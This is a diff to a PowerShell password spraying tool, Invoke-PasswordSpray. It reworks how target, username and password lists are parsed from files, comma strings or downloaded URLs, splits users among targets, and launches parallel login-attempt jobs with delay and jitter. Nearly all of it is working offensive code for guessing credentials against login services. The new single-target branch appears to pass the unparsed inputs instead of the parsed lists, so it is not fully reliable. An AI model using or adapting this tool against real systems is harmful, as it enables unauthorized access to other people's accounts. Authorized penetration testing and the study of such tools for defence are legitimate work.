@@ -2,11 +2,11 @@
   .SYNOPSIS
     Execute a password spraying attack.
   .PARAMETER Targets
-    Target, comma delimited targets, a local targets file, or an online comma delimited targets string. If more than one target is specified, the users will be split among the targets.
+    Target(s) to try and log in to. If more than one target is specified, the users will be split among the targets for a performance increase.
   .PARAMETER Users
-    User, comma delimited users, a local users file, or an online comma delimited users string.
+    Username(s) to attempt to log in as.
   .PARAMETER Passwords
-    Password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string. To be prompted for a password, provide "*" as the password.
+    Password(s) to spray with. To be prompted for a password, provide "*" as the password.
   .PARAMETER Delay
     A delay between each authentication attempt, in seconds.
   .PARAMETER Jitter
@@ -18,12 +18,17 @@
 function Invoke-PasswordSpray
 {
   param(
-    [Parameter(Mandatory=$True)]$Targets,
-    [Parameter(Mandatory=$True)]$Users,
-    [Parameter(Mandatory=$True)]$Passwords,
+    [Parameter(Mandatory=$True)][string]$Targets,
+    [Parameter(Mandatory=$True)][string]$Users,
+    [Parameter(Mandatory=$True)][string]$Passwords,
     [double]$Jitter = 0.20,
     [double]$Delay = 0.00
   )
+
+  Write-Host ((Get-Date -Format [hh:mm:ss]) + " Parsing inputs... ")
+  [System.Collections.ArrayList]$UsersValue = @()
+  [System.Collections.ArrayList]$TargetsValue = @()
+  [System.Collections.ArrayList]$PasswordsValue = @()
   [System.Collections.ArrayList]$Parameters = @("Targets","Users","Passwords")
   if($Passwords -eq "*")
   {
@@ -34,11 +39,19 @@ function Invoke-PasswordSpray
   {
     if((Test-Path (Get-Variable -Name $Parameter -ValueOnly)) -eq $True)
     {
-      Set-Variable -Name $Parameter -Value (Get-Content (Get-Variable -Name $Parameter -ValueOnly))
+      (Get-Content (Get-Variable -Name $Parameter -ValueOnly)) | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
     }
-    elseif((Get-Variable -Name $Parameter -ValueOnly).Contains("http://") -or (Get-Variable -Name $Parameter -ValueOnly).Contains("https://"))
+    elseif((Get-Variable -Name ($Parameter) -ValueOnly).Contains("http://") -or (Get-Variable -Name $Parameter -ValueOnly).Contains("https://"))
     {
-      Set-Variable -Name $Parameter -Value ((New-Object System.Net.WebClient).DownloadString((Get-Variable -Name $Parameter -ValueOnly)).Split(","))
+      ((New-Object System.Net.WebClient).DownloadString((Get-Variable -Name $Parameter -ValueOnly)).Split(",")) | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
+    }
+    elseif((Get-Variable -Name ($Parameter) -ValueOnly).Contains(","))
+    {
+      (Get-Variable -Name $Parameter -ValueOnly).Split(",")  | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
+    }
+    else
+    {
+      (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add((Get-Variable -Name $Parameter -ValueOnly)) | Out-Null
     }
   }
 
@@ -71,30 +84,28 @@ function Invoke-PasswordSpray
     return $Result
   }
 
-  if($Targets.Count -gt 1)
+  if($TargetsValue.Count -gt 1)
   {
     $SplitUsers = @{}
-    $Base = 0
-    $TargetCounter = -1
-    $ChunkSize = [int]($Users.Count/$Targets.Count)
-    while($Base -lt $Users.Count)
+    foreach($TargetCounter in (1..$TargetsValue.Count))
     {
-      $TargetCounter += 1
-      if(($Base + $ChunkSize) -gt $Users.Count)
+      if($TargetCounter -ne $TargetsValue.Count)
       {
-        $SplitUsers[$TargetCounter] = $Users[$Base..($Users.Count-1)]
+        $SplitUsers[$TargetCounter] = $UsersValue[(([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1))..((([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1)) + ([int]($UsersValue.Count/$TargetsValue.Count)) - 1)]
+      }
+      else
+      {
+        $SplitUsers[$TargetCounter] = $UsersValue[(([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1))..$UsersValue.Count]
         break
       }
-      $SplitUsers[$TargetCounter] = $Users[$Base..($Base+$Chunksize-1)]
-      $Base+=$ChunkSize
     }
   }
 
   Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
-  foreach($Target in $Targets)
+  foreach($Target in $TargetsValue)
   {
-    if($Targets.Count -gt 1){$Arguments = @($Target,$SplitUsers[$Targets.IndexOf($Target)],$Passwords)}
-    else{$Arguments = @($Target,$Users,$Passwords)}
+    if($TargetsValue.Count -gt 1){$Arguments = @($Target,$SplitUsers[($TargetsValue.IndexOf($Target)+1)],$Passwords,$Jitter,$Delay)}
+    else{$Arguments = @($Target,$Users,$Passwords,$Jitter,$Delay)}
     $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
   }
 
